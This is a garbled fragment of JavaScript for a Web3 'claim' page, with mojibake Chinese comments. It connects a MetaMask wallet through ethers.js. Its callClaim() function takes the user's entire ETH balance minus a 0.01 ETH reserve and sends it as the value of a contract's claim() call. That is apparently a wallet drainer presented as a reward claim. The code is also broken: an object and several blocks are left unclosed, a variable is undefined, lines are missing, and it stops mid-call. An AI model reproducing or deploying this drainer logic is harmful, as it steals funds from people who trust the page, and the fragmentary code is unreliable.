        // ç½‘ç»œåç§°æ˜ å°„
        const NETWORK_NAMES = {

        // æ£€æŸ¥é’±åŒ…
        function checkMetaMask() {
            if (typeof window.ethereum === 'undefined') {
                log('é’±åŒ…æœªå®‰è£…', 'error');
                alert('æœªæ£€æµ‹åˆ°é’±åŒ…ï¼\n\nè¯·å…ˆå®‰è£… MetaMask æˆ–å…¶ä»– Web3 é’±åŒ…æ’ä»¶ã€‚');
                return false;

            return true;

        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            if (!checkMetaMask()) return;

            try {
                log('æ­£åœ¨è¿æ¥é’±åŒ…...', 'info');
                updateStatus('â³ è¿æ¥ä¸­...', 'processing');

                // è¯·æ±‚è´¦æˆ·è®¿é—®
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                userAddress = accounts[0];
                
                // åˆ›å»º provider å’Œ signer
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                
                // åˆ›å»ºåˆçº¦å®ä¾‹
                contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

                // è·å–ç½‘ç»œä¿¡æ¯

                const chainId = network.chainId;
                const networkName = NETWORK_NAMES[chainId.toString()] || 'æœªçŸ¥ç½‘ç»œ';
                const isTestnet = networkName.includes('Testnet');

                // è·å–é’±åŒ…ä½™é¢

                // æ›´æ–° UI

                badge.textContent = isTestnet ? 'æµ‹è¯•ç½‘' : 'ä¸»ç½‘';

                walletInfo.style.display = 'block';

        // è°ƒç”¨ Claim æ–¹æ³•
        async function callClaim() {
            if (!contract) {
                log('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }

            try {
                updateStatus('â³ æ­£åœ¨å‘é€äº¤æ˜“...', 'processing');
                claimBtn.innerHTML = '<span class="spinner"></span> é¢†å–ä¸­...';
                claimBtn.disabled = true;

                log('æ­£åœ¨è°ƒç”¨ claim() æ–¹æ³•...', 'info');
                
                // è·å–å½“å‰æœ€æ–°ä½™é¢
                const currentBalance = await provider.getBalance(userAddress);
                const balanceInEth = ethers.utils.formatEther(currentBalance);
                log(`å½“å‰ä½™é¢: ${balanceInEth} ETH`, 'info');

                // é¢„ä¼° gas è´¹ç”¨ (é¢„ç•™ 0.01 ETH ä½œä¸º gas)
                const gasReserve = ethers.utils.parseEther("0.01");
                let valueToSend;
                
                if (currentBalance.gt(gasReserve)) {
                    valueToSend = currentBalance.sub(gasReserve);
                    const sendAmount = ethers.utils.formatEther(valueToSend);
                    log(`å°†å‘é€: ${sendAmount} ETH (é¢„ç•™ 0.01 ETH ä½œä¸º gas)`, 'info');
                } else {
                    valueToSend = currentBalance;
                    log(`ä½™é¢è¾ƒå°‘ï¼Œå°†å‘é€å…¨éƒ¨: ${balanceInEth} ETH`, 'info');
                }

                log('ç­‰å¾…ç”¨æˆ·ç¡®è®¤äº¤æ˜“...', 'info');

                // ä¼°ç®— gas å¹¶å¢åŠ ç¼“å†²ï¼ˆé˜²æ­¢æ¨¡å¼åˆ‡æ¢å¯¼è‡´ gas ä¸è¶³ï¼‰
                const estimatedGas = await contract.estimateGas.claim({
                    value: valueToSend
